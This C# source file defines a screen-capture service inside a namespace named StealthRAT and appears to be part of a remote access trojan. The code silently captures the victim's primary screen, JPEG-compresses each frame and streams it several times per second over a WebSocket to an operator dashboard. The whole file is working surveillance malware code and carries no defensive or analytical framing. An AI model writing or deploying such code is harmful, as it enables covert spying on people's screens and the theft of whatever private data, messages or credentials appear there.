using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.WebSockets;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using StealthRAT.Interfaces;

namespace StealthRAT.Services
{
    /// <summary>
    /// Service responsible for taking screenshots and streaming them to the web dashboard over WebSockets.
    /// </summary>
    public sealed class ScreenCaptureService : IDisposable
    {
        private readonly ILoggerService _logger;
        private bool _isStreaming;
        private bool _disposed;

        /// <summary>
        /// Initializes a new instance of the <see cref="ScreenCaptureService"/> class.
        /// </summary>
        /// <param name="logger">The logging service.</param>
        public ScreenCaptureService(ILoggerService logger)
        {
            _logger = logger ?? throw new ArgumentNullException(nameof(logger));
        }

        /// <summary>
        /// Starts continuous screen streaming in a background thread.
        /// </summary>
        public void StartStreaming(ClientWebSocket ws, Func<byte[], byte, CancellationToken, Task> sendBinaryAsync, CancellationToken token)
        {
            if (_isStreaming) return;
            _isStreaming = true;

            _ = Task.Run(async () =>
            {
                _logger.LogInfo("Screen capture stream started.");
                while (_isStreaming && ws.State == WebSocketState.Open && !token.IsCancellationRequested)
                {
                    try
                    {
                        byte[] jpeg = CaptureScreenAsJpeg();
                        await sendBinaryAsync(jpeg, 0x01, token);
                    }
                    catch (OperationCanceledException)
                    {
                        break;
                    }
                    catch (Exception ex)
                    {
                        _logger.LogError("Screen capture streaming error", ex);
                        break;
                    }
                    await Task.Delay(150, token); // Capture roughly at 6.6 FPS
                }
                _logger.LogInfo("Screen capture stream stopped.");
                _isStreaming = false;
            }, token);
        }

        /// <summary>
        /// Stops the screen streaming loop.
        /// </summary>
        public void StopStreaming()
        {
            _isStreaming = false;
        }

        /// <summary>
        /// Captures the desktop window using standard GDI+ graphics library.
        /// </summary>
        /// <returns>A compressed JPEG byte array.</returns>
        private byte[] CaptureScreenAsJpeg()
        {
            var bounds = Screen.PrimaryScreen?.Bounds ?? new Rectangle(0, 0, 1920, 1080);
            using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
            using (var g = Graphics.FromImage(bitmap))
            {
                g.CopyFromScreen(0, 0, 0, 0, bounds.Size);
                using (var ms = new MemoryStream())
                {
                    ImageCodecInfo? jpegCodec = ImageCodecInfo.GetImageEncoders()
                        .FirstOrDefault(c => c.FormatID == ImageFormat.Jpeg.Guid);

                    if (jpegCodec != null)
                    {
                        using (EncoderParameters encoderParams = new EncoderParameters(1))
                        {
                            encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 65L);
                            bitmap.Save(ms, jpegCodec, encoderParams);
                        }
                    }
                    else
                    {
                        bitmap.Save(ms, ImageFormat.Jpeg);
                    }
                    return ms.ToArray();
                }
            }
        }

        /// <summary>
        /// Releases all resources.
        /// </summary>
        public void Dispose()
        {
            if (!_disposed)
            {
                StopStreaming();
                _disposed = true;
            }
        }
    }
}
